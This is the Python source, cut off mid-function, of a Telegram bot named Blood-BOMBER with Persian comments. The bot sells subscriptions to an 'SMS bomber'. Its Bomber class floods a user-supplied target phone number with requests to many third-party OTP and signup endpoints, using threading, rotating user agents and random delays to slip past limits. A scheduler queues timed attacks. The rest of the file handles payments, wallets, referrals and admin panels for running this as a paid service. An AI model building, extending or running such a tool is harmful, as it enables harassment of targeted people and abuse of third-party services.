import random
import threading
import time
import requests
import os
import sqlite3
import uuid
import telebot
from telebot import types
from flask import Flask
from datetime import datetime

# ==========================================
# 0. تنظیمات
# ==========================================
BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
ADMIN_ID = 6914309071
OWNER_USERNAME = "@Im_Patrick"
CARD_NUMBER = "0000-0000-0000-0000"
DB_FILE = "bot_database.db"
PANEL_IMAGE_URL = "https://i.imgur.com/Z7lvgzO.jpeg"
CHANNEL_1 = "@BloodBomber_Chanel"
LOG_CHANNEL = None  # اگر خواستی آیدی کانال لاگ رو بذار

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

try:
    from services import SERVICES_LIST
except ImportError:
    SERVICES_LIST = []

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

# ==========================================
# 1. وب‌سرور Render
# ==========================================
app = Flask(__name__)

@app.route('/')
def health():
    return "Bot is running!", 200

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, use_reloader=False)

threading.Thread(target=run_web, daemon=True).start()

# ==========================================
# 2. دیتابیس (کامل‌تر)
# ==========================================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY, name TEXT, plan TEXT, uses INTEGER,
        last_daily REAL, sub_expiry REAL, daily_bomb_count INTEGER, last_bomb_date TEXT,
        total_purchases INTEGER DEFAULT 0, free_trial_used INTEGER DEFAULT 0,
        last_bomb_time REAL DEFAULT 0, silent_mode INTEGER DEFAULT 0,
        is_banned INTEGER DEFAULT 0, last_active REAL DEFAULT 0, streak INTEGER DEFAULT 0,
        wallet INTEGER DEFAULT 0, xp INTEGER DEFAULT 0, level INTEGER DEFAULT 1,
        referral_count INTEGER DEFAULT 0, referred_by TEXT DEFAULT NULL,
        last_daily_bomb_date TEXT DEFAULT NULL)''')
    c.execute('''CREATE TABLE IF NOT EXISTS schedules (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, phone TEXT,
        run_time REAL, is_sent INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS products (
        id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, price INTEGER,
        description TEXT, content TEXT, stock INTEGER DEFAULT -1,
        category TEXT DEFAULT 'عمومی')''')
    c.execute('''CREATE TABLE IF NOT EXISTS gift_codes (
        code TEXT PRIMARY KEY, amount INTEGER, max_uses INTEGER,
        used_count INTEGER DEFAULT 0, created_at REAL)''')
    c.execute('''CREATE TABLE IF NOT EXISTS purchases (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, item_name TEXT,
        price INTEGER, created_at REAL)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tickets (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, message TEXT,
        status TEXT DEFAULT 'open', created_at REAL, admin_reply TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, amount INTEGER,
        type TEXT, description TEXT, created_at REAL)''')
    conn.commit()
    conn.close()

init_db()

# ==========================================
# 3. توابع کمکی دیتابیس
# ==========================================
def get_user(user_id):
    user_id = str(user_id)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        return None
    keys = ["user_id","name","plan","uses","last_daily","sub_expiry","daily_bomb_count",
            "last_bomb_date","total_purchases","free_trial_used","last_bomb_time",
            "silent_mode","is_banned","last_active","streak","wallet","xp","level",
            "referral_count","referred_by","last_daily_bomb_date"]
    return dict(zip(keys, row))

def save_user(**u):
    u['user_id'] = str(u.get('user_id'))
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""INSERT OR REPLACE INTO users
        (user_id, name, plan, uses, last_daily, sub_expiry, daily_bomb_count,
         last_bomb_date, total_purchases, free_trial_used, last_bomb_time,
         silent_mode, is_banned, last_active, streak, wallet, xp, level,
         referral_count, referred_by, last_daily_bomb_date)
        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
        (u.get('user_id'), u.get('name',''), u.get('plan','free'), u.get('uses',0),
         u.get('last_daily',0), u.get('sub_expiry',0), u.get('daily_bomb_count',0),
         u.get('last_bomb_date','2000-01-01'), u.get('total_purchases',0),
         u.get('free_trial_used',0), u.get('last_bomb_time',0), u.get('silent_mode',0),
         u.get('is_banned',0), u.get('last_active',0), u.get('streak',1),
         u.get('wallet',0), u.get('xp',0), u.get('level',1),
         u.get('referral_count',0), u.get('referred_by', None),
         u.get('last_daily_bomb_date', None)))
    conn.commit()
    conn.close()

def add_transaction(user_id, amount, type_, desc):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO transactions (user_id, amount, type, description, created_at) VALUES (?,?,?,?,?)",
              (str(user_id), amount, type_, desc, time.time()))
    conn.commit()
    conn.close()

def add_xp(user_id, amount):
    u = get_user(user_id)
    if not u:
        return
    u['xp'] += amount
    new_level = 1 + (u['xp'] // 100)
    if new_level > u['level']:
        u['level'] = new_level
        try:
            bot.send_message(user_id, f"🎉 **تبریک!** به سطح **{new_level}** رسیدی!", parse_mode='Markdown')
        except Exception:
            pass
    save_user(**u)

# ==========================================
# 4. وضعیت‌های سراسری
# ==========================================
user_states = {}
pending_approvals = {}
active_bombers = {}
active_bomber_stop = {}  # برای توقف

PLANS = {
    "basic": {"name": "پایه (۱ ماهه)", "price": 150, "days": 30, "daily_limit": 3},
    "pro":   {"name": "حرفه‌ای (۳ ماهه)", "price": 450, "days": 90, "daily_limit": 5},
    "vip":   {"name": "ویژه (۱ ساله)", "price": 600, "days": 365, "daily_limit": 10},
}

LEVEL_REWARDS = {
    2: 10, 3: 20, 5: 50, 10: 100, 20: 200
}

# ==========================================
# 5. عضویت کانال
# ==========================================
def is_user_joined(user_id):
    try:
        m = bot.get_chat_member(CHANNEL_1, user_id)
        return m.status in ['member', 'administrator', 'creator']
    except Exception:
        return True

def send_join_message(chat_id):
    m = types.InlineKeyboardMarkup(row_width=1)
    m.add(types.InlineKeyboardButton("📢 عضویت در کانال",
            url=f"https://t.me/{CHANNEL_1.replace('@', '')}"))
    m.add(types.InlineKeyboardButton("✅ عضو شدم", callback_data="check_join"))
    bot.send_message(chat_id, "⚠️ **ابتدا در کانال ما عضو شوید!**",
                     reply_markup=m, parse_mode='Markdown')

# ==========================================
# 6. بمبر (با قابلیت توقف)
# ==========================================
class Bomber:
    def __init__(self, phone, user_id, silent_mode=False):
        self.phone = phone
        self.user_id = str(user_id)
        self.silent_mode = silent_mode
        self.services = SERVICES_LIST
        self.session = requests.Session()
        self.success = 0
        self.fail = 0
        self.total = len(self.services)
        self.stop_event = threading.Event()

    def _send(self, svc):
        if self.stop_event.is_set():
            return
        try:
            data = svc['data'](self.phone)
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            method = svc['method'].upper()
            if method == 'POST':
                if svc.get('json', False):
                    r = self.session.post(svc['url'], json=data, headers=headers, timeout=5)
                else:
                    r = self.session.post(svc['url'], data=data, headers=headers, timeout=5)
            else:
                r = self.session.get(svc['url'], params=data, headers=headers, timeout=5)
            if r.status_code in (200, 201, 202, 204):
                self.success += 1
            else:
                self.fail += 1
        except Exception:
            self.fail += 1

    def _worker(self, chunk):
        for svc in chunk:
            if self.stop_event.is_set():
                break
            self._send(svc)
            time.sleep(random.uniform(0.3, 1.0))

    def start(self):
        try:
            if not self.services:
                bot.send_message(self.user_id, "❌ لیست سرویس‌ها خالی است.")
                return
            if not self.phone.startswith("+"):
                self.phone = "+98" + self.phone.lstrip("0")

            self.success = self.fail = 0
            chunk_size = max(1, self.total // 15)
            chunks = [self.services[i:i+chunk_size] for i in range(0, self.total, chunk_size)]
            threads = []

            status = bot.send_message(self.user_id,
                f"⏳ **در حال ارسال...**\n0/{self.total}", parse_mode='Markdown')

            for ch in chunks:
                t = threading.Thread(target=self._worker, args=(ch,))
                t.start()
                threads.append(t)

            last = time.time()
            while any(t.is_alive() for t in threads):
                if self.stop_event.is_set():
                    break
                if time.time() - last > 2:
                    done = self.success + self.fail
                    pct = int(done / self.total * 100) if self.total else 0
                    bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
                    try:
                        bot.edit_message_text(
                            f"⏳ **در حال ارسال...**\n\n✅ {self.success} | ❌ {self.fail}\n"
                            f"[{bar}] {pct}%\n{done}/{self.total}\n\n"
                            "برای توقف /stop_bomb را بزنید.",
                            self.user_id, status.message_id, parse_mode='Markdown')
                    except Exception:
                        pass
                    last = time.time()
                time.sleep(0.5)

            for t in threads:
                t.join()

            pct = int(self.success / self.total * 100) if self.total else 0
            stopped = " (متوقف شد)" if self.stop_event.is_set() else ""
            try:
                bot.edit_message_text(
                    f"🏁 **پایان{stopped}!**\n\n✅ {self.success}\n❌ {self.fail}\n📊 {pct}%",
                    self.user_id, status.message_id, parse_mode='Markdown')
            except Exception:
                pass

            add_xp(self.user_id, 5)
            add_transaction(self.user_id, 0, "bomb", f"بمبر به {self.phone}")
        except Exception as e:
            print(f"Bomber error: {e}")
        finally:
            active_bombers.pop(self.user_id, None)
            active_bomber_stop.pop(self.user_id, None)

# ==========================================
# 7. زمان‌بند
# ==========================================
def scheduler_loop():
    while True:
        try:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            now = time.time()
            c.execute("SELECT id, user_id, phone FROM schedules WHERE run_time <= ? AND is_sent = 0", (now,))
            for tid, uid, ph in c.fetchall():
                u = get_user(uid)
                if u and not u['is_banned']:
                    b = Bomber(ph, uid, u['silent_mode'])
                    active_bombers[str(uid)] = b
                    threading.Thread(target=b.start).start()
                    c.execute("UPDATE schedules SET is_sent = 1 WHERE id = ?", (tid,))
            conn.commit()
            conn.close()
        except Exception:
            pass
        time.sleep(30)

threading.Thread(target=scheduler_loop, daemon=True).start()

# ==========================================
# 8. منوها
# ==========================================
def get_main_menu():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(types.InlineKeyboardButton("🚀 اجرای بمبر", callback_data="menu_bomb"),
          types.InlineKeyboardButton("⏰ زمان‌بندی", callback_data="menu_schedule"))
    m.add(types.InlineKeyboardButton("🛒 خرید اشتراک", callback_data="menu_buy"),
          types.InlineKeyboardButton("📋 پروفایل", callback_data="menu_profile"))
    m.add(types.InlineKeyboardButton("💳 کیف پول", callback_data="menu_wallet"),
          types.InlineKeyboardButton("🛍 فروشگاه", callback_data="menu_shop"))
    m.add(types.InlineKeyboardButton("🎁 جایزه روزانه", callback_data="menu_daily"),
          types.InlineKeyboardButton("🔑 کد هدیه", callback_data="menu_gift"))
    m.add(types.InlineKeyboardButton("🏆 برترین‌ها", callback_data="menu_leaderboard"),
          types.InlineKeyboardButton("👥 دعوت دوستان", callback_data="menu_referral"))
    m.add(types.InlineKeyboardButton("📜 تاریخچه خرید", callback_data="menu_history"),
          types.InlineKeyboardButton("🎫 پشتیبانی", callback_data="menu_support"))
    return m

def get_admin_menu():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(types.InlineKeyboardButton("📊 آمار کامل", callback_data="admin_stats"),
          types.InlineKeyboardButton("👥 لیست کاربران", callback_data="admin_list_users"))
    m.add(types.InlineKeyboardButton("🔎 جستجوی کاربر", callback_data="admin_search_user"),
          types.InlineKeyboardButton("🚫 مسدود/آزاد", callback_data="admin_ban"))
    m.add(types.InlineKeyboardButton("💰 شارژ دستی", callback_data="admin_manual_charge"),
          types.InlineKeyboardButton("📢 پیام همگانی", callback_data="admin_broadcast"))
    m.add(types.InlineKeyboardButton("➕ افزودن محصول", callback_data="admin_add_product"),
          types.InlineKeyboardButton("🗑 حذف محصول", callback_data="admin_del_product"))
    m.add(types.InlineKeyboardButton("🔑 ساخت کد هدیه", callback_data="admin_make_gift"),
          types.InlineKeyboardButton("📋 تیکت‌های باز", callback_data="admin_tickets"))
    m.add(types.InlineKeyboardButton("💾 بکاپ دیتابیس", callback_data="admin_backup"))
    return m

# ==========================================
# 9. /start و /admin و /stop_bomb
# ==========================================
@bot.message_handler(commands=['start'])
def cmd_start(message):
    uid = str(message.from_user.id)
    if not is_user_joined(uid):
        send_join_message(message.chat.id)
        return

    u = get_user(uid)
    if not u:
        # بررسی رفرال
        args = message.text.split()
        ref_by = None
        if len(args) > 1 and args[1].startswith("ref_"):
            ref_by = args[1].replace("ref_", "")
            ref_user = get_user(ref_by)
            if ref_user and ref_by != uid:
                ref_user['wallet'] += 5
                ref_user['referral_count'] += 1
                save_user(**ref_user)
                add_transaction(ref_by, 5, "referral", f"دعوت {uid}")
                try:
                    bot.send_message(ref_by, f"🎉 یک نفر با لینک تو عضو شد! ۵ تومان گرفتی.")
                except Exception:
                    pass

        save_user(user_id=uid, name=message.from_user.first_name, plan="free",
                  last_bomb_date="2000-01-01", last_active=time.time(),
                  streak=1, wallet=10, referred_by=ref_by)  # ۱۰ تومان هدیه خوش‌آمد
        u = get_user(uid)
        bot.send_message(message.chat.id, "🎁 **۱۰ تومان** هدیه‌ی خوش‌آمدگویی به کیف پولت اضافه شد!", parse_mode='Markdown')
    elif u['is_banned']:
        bot.send_message(message.chat.id, "⛔ **شما مسدود شده‌اید!**", parse_mode='Markdown')
        return
    else:
        u['last_active'] = time.time()
        save_user(**u)

    if u['sub_expiry'] > time.time():
        days = (u['sub_expiry'] - time.time()) / 86400
        if 0 < days <= 3:
            bot.send_message(message.chat.id,
                f"⚠️ فقط **{int(days)} روز** از اشتراکت مانده.", parse_mode='Markdown')

    cap = (f"سلام [{message.from_user.first_name}](tg://user?id={uid}) 👋\n"
           f"به **Blood-BOMBER** خوش آمدی.\n\n"
           f"💰 کیف پول: **{u['wallet']}** تومان\n"
           f"⭐ سطح: **{u['level']}** | XP: {u['xp']}\n"
           f"🔥 استریک: **{u['streak']}** روز")
    try:
        bot.send_photo(message.chat.id, PANEL_IMAGE_URL, caption=cap,
                       reply_markup=get_main_menu(), parse_mode='Markdown')
    except Exception:
        bot.send_message(message.chat.id, cap, reply_markup=get_main_menu(), parse_mode='Markdown')

@bot.message_handler(commands=['admin'])
def cmd_admin(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.reply_to(message, "👑 **پنل مدیریت**", reply_markup=get_admin_menu(), parse_mode='Markdown')

@bot.message_handler(commands=['stop_bomb'])
def cmd_stop(message):
    uid = str(message.from_user.id)
    if uid in active_bombers:
        active_bombers[uid].stop_event.set()
        bot.reply_to(message, "⏹ درخواست توقف ارسال شد.")
    else:
        bot.reply_to(message, "❌ بمبر فعالی نداری.")

# ==========================================
# 10. رسید (باید قبل از on_callback باشه)
# ==========================================
@bot.callback_query_handler(func=lambda c: c.data.startswith("approve_") or c.data.startswith("reject_"))
def on_receipt(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "فقط ادمین!")
        return
    parts = call.data.split("_")
    action = parts[0]
    key = parts[1]
    if key not in pending_approvals:
        bot.answer_callback_query(call.id, "قبلاً بررسی شده.")
        return
    info = pending_approvals.pop(key)
    target = info["user_id"]

    if action == "approve":
        user_states[str(call.from_user.id)] = {"state": "receipt_amount", "target": target}
        bot.send_message(ADMIN_ID, f"💰 چقدر به کاربر `{target}` اضافه شود؟", parse_mode='Markdown')
        try:
            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
        except Exception:
            pass
    else:
        try:
            bot.send_message(target, "❌ رسید شما رد شد.")
        except Exception:
            pass
        try:
            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
        except Exception:
            pass
        bot.answer_callback_query(call.id, "رد شد.")

# ==========================================
# 11. Callback اصلی
# ==========================================
@bot.callback_query_handler(func=lambda c: True)
def on_callback(call):
    uid = str(call.from_user.id)
    data = call.data
    u = get_user(uid)

    if data != "check_join" and not is_user_joined(uid):
        bot.answer_callback_query(call.id, "⚠️ ابتدا عضو کانال شوید!", show_alert=True)
        return
    if u and u['is_banned'] and not data.startswith("admin_"):
        bot.answer_callback_query(call.id, "⛔ مسدود هستید!", show_alert=True)
        return
    if data.startswith("admin_") and call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "فقط ادمین!")
        return

    # --- بازگشت ---
    if data == "menu_back":
        if not u:
            return
        try:
            bot.edit_message_media(
                types.InputMediaPhoto(PANEL_IMAGE_URL, caption="منوی اصلی:", parse_mode='Markdown'),
                call.message.chat.id, call.message.message_id, reply_markup=get_main_menu())
        except Exception:
            bot.send_message(call.message.chat.id, "منوی اصلی:", reply_markup=get_main_menu())

    elif data == "check_join":
        if is_user_joined(uid):
            bot.answer_callback_query(call.id, "✅ عضو شدی!", show_alert=True)
            bot.send_message(call.message.chat.id, "منوی اصلی:", reply_markup=get_main_menu())
        else:
            bot.answer_callback_query(call.id, "❌ هنوز عضو نشدی!", show_alert=True)

    # --- کیف پول ---
    elif data == "menu_wallet":
        text = (f"💳 **کیف پول:**\n\nموجودی: **{u['wallet']}** تومان\n\n"
                "برای شارژ، مبلغ را واریز کرده و عکس رسید بفرستید.")
        m = types.InlineKeyboardMarkup(row_width=1)
        m.add(types.InlineKeyboardButton("💳 شارژ (کارت به کارت)", callback_data="wallet_charge"))
        m.add(types.InlineKeyboardButton("📜 تاریخچه تراکنش‌ها", callback_data="wallet_tx"))
        m.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    elif data == "wallet_charge":
        user_states[uid] = {"state": "wait_receipt"}
        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_wallet"))
        text = f"💳 مبلغ را به کارت زیر واریز و **عکس رسید** بفرستید:\n\n`{CARD_NUMBER}`"
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    elif data == "wallet_tx":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT amount, type, description, created_at FROM transactions WHERE user_id = ? ORDER BY id DESC LIMIT 15", (uid,))
        rows = c.fetchall()
        conn.close()
        text = "📜 **۱۵ تراکنش اخیر:**\n\n"
        if not rows:
            text += "هنوز تراکنشی نداری."
        for r in rows:
            dt = datetime.fromtimestamp(r[3]).strftime("%m/%d %H:%M")
            sign = "+" if r[1] in ("deposit", "referral", "daily", "gift") else "-"
            text += f"`{dt}` | {sign}{r[0]}ت | {r[2]}\n"
        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_wallet"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    # --- فروشگاه ---
    elif data == "menu_shop":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT id, name, price, description, category, stock FROM products")
        prods = c.fetchall()
        conn.close()
        if not prods:
            bot.answer_callback_query(call.id, "فروشگاه خالی است.")
            return
        text = "🛍 **فروشگاه:**\n\n"
        m = types.InlineKeyboardMarkup(row_width=1)
        for p in prods:
            stock_txt = "" if p[5] < 0 else f" | موجودی: {p[5]}"
            text += f"🔹 **{p[1]}** — {p[2]}ت{stock_txt}\n📝 {p[3]}\n📁 {p[4]}\n\n"
            m.add(types.InlineKeyboardButton(f"خرید {p[1]}", callback_data=f"buy_product_{p[0]}"))
        m.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    elif data.startswith("buy_product_"):
        pid = int(data.replace("buy_product_", ""))
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT name, price, content, stock FROM products WHERE id = ?", (pid,))
        p = c.fetchone()
        conn.close()
        if not p:
            bot.answer_callback_query(call.id, "محصول یافت نشد.")
            return
        if p[3] == 0:
            bot.answer_callback_query(call.id, "❌ ناموجود!", show_alert=True)
            return
        if u['wallet'] < p[1]:
            bot.answer_callback_query(call.id, f"❌ موجودی کافی نیست! نیاز: {p[1]}", show_alert=True)
            return
        u['wallet'] -= p[1]
        u['total_purchases'] += 1
        save_user(**u)
        add_transaction(uid, p[1], "purchase", f"خرید {p[0]}")
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO purchases (user_id, item_name, price, created_at) VALUES (?,?,?,?)",
                  (uid, p[0], p[1], time.time()))
        if p[3] > 0:
            c.execute("UPDATE products SET stock = stock - 1 WHERE id = ?", (pid,))
        conn.commit()
        conn.close()
        add_xp(uid, 10)
        bot.answer_callback_query(call.id, "✅ خرید موفق!", show_alert=True)
        bot.send_message(call.message.chat.id,
            f"🎉 **خرید موفق!**\n📦 {p[0]}\n\n📝 محتوا:\n`{p[2]}`", parse_mode='Markdown')
        try:
            bot.send_message(ADMIN_ID, f"🛒 خرید جدید: `{uid}` → {p[0]} ({p[1]}ت)")
        except Exception:
            pass

    # --- تاریخچه خرید ---
    elif data == "menu_history":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT item_name, price, created_at FROM purchases WHERE user_id = ? ORDER BY id DESC LIMIT 15", (uid,))
        rows = c.fetchall()
        conn.close()
        text = "📜 **تاریخچه خرید:**\n\n"
        if not rows:
            text += "هنوز خریدی نداری."
        for r in rows:
            dt = datetime.fromtimestamp(r[2]).strftime("%m/%d %H:%M")
            text += f"`{dt}` | {r[0]} — {r[1]}ت\n"
        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    # --- پروفایل ---
    elif data == "menu_profile":
        pname = PLANS[u['plan']]['name'] if u['plan'] in PLANS else "رایگان"
        vip = (f"فعال ({int((u['sub_expiry'] - time.time()) / 86400)} روز)"
               if u['sub_expiry'] > time.time() else "ندارد")
        sil = "روشن" if u['silent_mode'] else "خاموش"
        text = (f"📋 **پروفایل:**\n\n👤 {u['name']}\n🆔 `{uid}`\n"
                f"💎 پلن: **{pname}**\n👑 اشتراک: **{vip}**\n"
                f"💳 کیف پول: **{u['wallet']}** تومان\n"
                f"⭐ سطح: **{u['level']}** | XP: {u['xp']}\n"
                f"👥 دعوت‌شده: **{u['referral_count']}**\n"
                f"🕵️ بی‌صدا: **{sil}**\n🔥 استریک: **{u['streak']} روز**\n"
                f"🛒 خریدها: **{u['total_purchases']}**")
        m = types.InlineKeyboardMarkup(row_width=1)
        m.add(types.InlineKeyboardButton("🔕 تغییر حالت بی‌صدا", callback_data="toggle_silent"))
        m.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    elif data == "toggle_silent":
        u['silent_mode'] = 1 - u['silent_mode']
        save_user(**u)
        st = "روشن" if u['silent_mode'] else "خاموش"
        bot.answer_callback_query(call.id, f"بی‌صدا: {st}", show_alert=True)
        pname = PLANS[u['plan']]['name'] if u['plan'] in PLANS else "رایگان"
        vip = (f"فعال ({int((u['sub_expiry'] - time.time()) / 86400)} روز)"
               if u['sub_expiry'] > time.time() else "ندارد")
        text = (f"📋 **پروفایل:**\n\n👤 {u['name']}\n🆔 `{uid}`\n"
                f"💎 پلن: **{pname}**\n👑 اشتراک: **{vip}**\n"
                f"💳 کیف پول: **{u['wallet']}** تومان\n"
                f"⭐ سطح: **{u['level']}** | XP: {u['xp']}\n"
                f"👥 دعوت‌شده: **{u['referral_count']}**\n"
                f"🕵️ بی‌صدا: **{st}**\n🔥 استریک: **{u['streak']} روز**\n"
                f"🛒 خریدها: **{u['total_purchases']}**")
        m = types.InlineKeyboardMarkup(row_width=1)
        m.add(types.InlineKeyboardButton("🔕 تغییر حالت بی‌صدا", callback_data="toggle_silent"))
        m.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    # --- بمبر ---
    elif data == "menu_bomb":
        if not u:
            return
        today = datetime.now().strftime("%Y-%m-%d")
        if u.get('last_daily_bomb_date') == today and u['daily_bomb_count'] >= PLANS.get(u['plan'], {}).get('daily_limit', 3):
            bot.answer_callback_query(call.id, "❌ به سقف روزانه رسیدی! فردا بیا.", show_alert=True)
            return
        user_states[uid] = {"state": "wait_phone"}
        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
        bot.edit_message_caption("🚀 **شماره هدف را وارد کن:**\nمثال: 09123456789",
                                 call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    # --- زمان‌بندی ---
    elif data == "menu_schedule":
        user_states[uid] = {"state": "wait_sched_phone"}
        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
        bot.edit_message_caption("⏰ **شماره هدف برای زمان‌بندی:**",
                                 call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    # --- خرید اشتراک ---
    elif data == "menu_buy":
        text = "🛒 **پلن‌های اشتراک:**\n\n"
        m = types.InlineKeyboardMarkup(row_width=1)
        for k, p in PLANS.items():
            text += f"🔹 **{p['name']}** — {p['price']}ت\n   سقف روزانه: {p['daily_limit']}\n\n"
            m.add(types.InlineKeyboardButton(f"خرید {p['name']}", callback_data=f"buy_plan_{k}"))
        m.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    elif data.startswith("buy_plan_"):
        k = data.replace("buy_plan_", "")
        p = PLANS.get(k)
        if not p:
            bot.answer_callback_query(call.id, "پلن یافت نشد.")
            return
        if u['wallet'] < p['price']:
            bot.answer_callback_query(call.id, f"❌ نیاز: {p['price']}ت", show_alert=True)
            return
        u['wallet'] -= p['price']
        now = time.time()
        u['sub_expiry'] = (u['sub_expiry'] if u['sub_expiry'] > now else now) + p['days'] * 86400
        u['plan'] = k
        u['total_purchases'] += 1
        save_user(**u)
        add_transaction(uid, p['price'], "purchase", f"اشتراک {p['name']}")
        add_xp(uid, 20)
        bot.answer_callback_query(call.id, "✅ فعال شد!", show_alert=True)
        bot.send_message(call.message.chat.id,
            f"🎉 **{p['name']} فعال شد!**\n📅 {p['days']} روز", parse_mode='Markdown')

    # --- جایزه روزانه ---
    elif data == "menu_daily":
        now = time.time()
        if now - u['last_daily'] < 86400:
            left = int((86400 - (now - u['last_daily'])) / 3600)
            bot.answer_callback_query(call.id, f"⏳ {left} ساعت دیگه!", show_alert=True)
            return
        base = random.randint(5, 20)
        bonus = u['streak'] * 2  # پاداش استریک
        total = base + bonus
        u['wallet'] += total
        u['last_daily'] = now
        u['streak'] = u['streak'] + 1
        save_user(**u)
        add_transaction(uid, total, "daily", f"جایزه روزانه + استریک {u['streak']}")
        add_xp(uid, 5)
        bot.answer_callback_query(call.id, f"🎁 {total}ت گرفتی!", show_alert=True)
        bot.send_message(call.message.chat.id,
            f"🎁 **جایزه روزانه:** {base}ت + پاداش استریک {bonus}ت = **{total}ت**\n"
            f"🔥 استریک: **{u['streak']}** روز", parse_mode='Markdown')

    # --- کد هدیه ---
    elif data == "menu_gift":
        user_states[uid] = {"state": "wait_gift"}
        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
        bot.edit_message_caption("🔑 **کد هدیه را وارد کن:**",
                                 call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    # --- دعوت دوستان ---
    elif data == "menu_referral":
        bot_username = bot.get_me().username
        link = f"https://t.me/{bot_username}?start=ref_{uid}"
        text = (f"👥 **دعوت دوستان:**\n\n"
                f"لینک اختصاصی تو:\n`{link}`\n\n"
                f"به ازای هر نفر: **۵ تومان**\n"
                f"تعداد دعوت‌شده: **{u['referral_count']}**")
        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    # --- پشتیبانی (تیکت) ---
    elif data == "menu_support":
        m = types.InlineKeyboardMarkup(row_width=1)
        m.add(types.InlineKeyboardButton("🎫 ارسال تیکت", callback_data="ticket_new"))
        m.add(types.InlineKeyboardButton("📬 تیکت‌های من", callback_data="ticket_mine"))
        m.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption("🎧 **پشتیبانی:**\n\nاز کدام بخش استفاده می‌کنی؟",
                                 call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    elif data == "ticket_new":
        user_states[uid] = {"state": "wait_ticket"}
        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_support"))
        bot.edit_message_caption("🎫 **پیامت را بنویس:**",
                                 call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    elif data == "ticket_mine":
        conn = sqlite3.connect(DB_FILE)
